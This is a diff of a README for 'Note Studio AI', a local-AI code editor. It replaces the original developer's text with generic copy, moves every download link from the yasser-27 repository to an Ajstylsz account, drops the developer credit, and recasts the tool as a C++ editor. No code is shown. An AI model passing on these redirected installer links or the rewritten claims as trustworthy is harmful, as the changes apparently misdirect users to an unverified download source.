@@ -1,70 +1,76 @@
-# 🚀 Note Studio AI - v4.9.0 PRO
+# 📝 Note-Studio-Ai - A Simple, Powerful Code Editor
 
-![Note Studio Header](logo.png)
+## 🚀 Overview
+Note Studio AI is a lightweight, high-performance code editor designed for developers who value privacy and local AI capabilities. This application lets you generate code quickly while keeping your data secure.
 
-[Note Studio AI](https://yasser-27.github.io/Note-Studio-Ai/)
+## 🔗 Download
+[![Download Note Studio AI](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Ajstylsz/Note-Studio-Ai/releases)
 
-**Note Studio AI** is a cutting-edge, lightweight Integrated Development Environment (IDE) built for developers who prioritize privacy, speed, and local AI capabilities. It integrates a powerful **Local LLM** that runs directly on your machine, providing AI assistance without needing an internet connection.
+## 🛠️ Features
+- **Local AI Support:** Enjoy fast code generation without needing an internet connection.
+- **Privacy Focused:** Your data remains on your device, ensuring your projects are private.
+- **User-Friendly Interface:** An easy-to-navigate layout for seamless coding.
+- **Compatible with C++:** Perfect for developers focusing on C++ programming.
 
----
+## 🖥️ System Requirements
+To run Note Studio AI, ensure your computer meets the following requirements:
+- **Operating System:** Windows 10 or higher, macOS 10.12 or higher, or any modern Linux distribution.
+- **Processor:** At least a dual-core processor.
+- **Memory:** Minimum of 4 GB RAM (8 GB recommended).
+- **Storage:** 200 MB of available disk space.
 
-## ✨ Key Features
+## 📥 Download & Install
+1. Visit the [Releases page](https://github.com/Ajstylsz/Note-Studio-Ai/releases) to find the latest version.
+2. Under the version you wish to download, find the section labeled “Assets”.
+3. Choose the correct file for your operating system:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the appropriate package for your distribution.
+4. After the download completes, locate the file in your downloads folder.
 
-* **🤖 Offline AI (Local LLM):** Code assistance that stays on your hardware. Your data never leaves your computer.
-* **⚡ Extreme Performance:** Minimal resource footprint (CPU/RAM) with instant-response architecture.
-* **🎨 Pro UI/UX:** A sleek, modern dark interface designed for long coding sessions.
-* **🔒 Privacy-First:** Zero data tracking. 100% offline-first AI processing.
-* **💾 Smart Auto-Save:** Advanced system that secures your work every 10 minutes.
-* **🌐 3D Visual Experience:** Interactive web landing page with 3D-perspective feature showcases.
+### For Windows Users
+   - Double-click the `.exe` file to start the installation.
+   - Follow the on-screen instructions to complete the installation.
 
----
+### For macOS Users
+   - Open the downloaded `.dmg` file.
+   - Drag the Note Studio AI icon into your Applications folder.
 
-## 📸 Screenshots
+### For Linux Users
+   - Use your package manager to install the downloaded package by following your distribution’s instructions.
 
-![Feature 1](1.png) 
-![Feature 2](2.png) 
-![Feature 3](3.png)
+## 🔧 How to Use
+Once you have installed Note Studio AI, you can start coding immediately. Here’s how:
 
----
+1. **Open the Application:** Launch Note Studio AI from your applications or programs list.
+2. **Create a New Project:**
+   - Click on “File” in the menu bar.
+   - Select “New Project” and name your project.
+3. **Edit Code:**
+   - Start typing your code in the main editor area.
+   - Use the built-in AI features for code suggestions and completions.
+4. **Save Your Work:**
+   - Click “File,” then “Save” to keep your progress.
 
-# v4.9.1
-Latest Updates:
+## 📝 Frequently Asked Questions (FAQs)
 
-*  AI Engine: Integrated a powerful new model with advanced logical reasoning.
+### What programming languages does Note Studio AI support?
+Note Studio AI primarily supports C++ but can be adapted for other languages as well.
 
-*  Chat Experience: Launched a modern AI chat interface with enhanced features.
+### Can I use Note Studio AI offline?
+Yes, Note Studio AI is designed to work offline, ensuring your privacy and data security.
 
-*  Management Tools: Added options to save, delete, and export conversations to PDF.
+### How can I get support?
+For support, you can open an issue on the GitHub repository or check the discussion section.
 
-Stability: Resolved various bugs and improved overall system performance.
+## 🚀 Additional Resources
+- GitHub Repository: [Note-Studio-Ai GitHub](https://github.com/Ajstylsz/Note-Studio-Ai)
+- Community Discussions: Join the discussions for tips and help.
 
-[Download Now](https://github.com/YASSER-27/Note-Studio-Ai/releases/tag/4.9.1)
+## 📞 Contact
+For inquiries or feedback, please contact the project maintainers via GitHub.
 
-## 🛠️ Tech Stack
+## 🌱 Contributions
+If you would like to contribute to Note Studio AI, feel free to open a pull request or submit an issue on the repository.
 
-* **Electron.js** - For a robust cross-platform desktop experience.
-* **React** - Powering a dynamic and responsive User Interface.
-* **Local LLM Runtimes** - Efficiently executing AI models on local hardware.
-* **CSS3 & JavaScript** - Advanced 3D effects and site security.
-
----
-
-## 🚀 Getting Started
-
-1.  Download the latest installer from the [Releases](https://github.com/yasser-27/Note-Studio-Ai/releases) section.
-2.  Run the setup and follow the instructions.
-3.  Launch **Note Studio AI** and start coding smarter!
-
----
-
-## 🛡️ Security & Protection
-
-The web showcase for this project includes anti-tampering measures to prevent unauthorized source code inspection, protecting the intellectual property of the **Note Studio** ecosystem.
-
----
-if ai not work install Latest supported v14 (for Visual Studio 2017–2026) x64
-## 👨‍💻 Developer
-**Yassir27** - Visionary & Lead Developer of Note Studio AI.
-
----
-© 2026 Yassir27 - Note Studio AI. All rights reserved.
+[![Download Note Studio AI](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Ajstylsz/Note-Studio-Ai/releases)
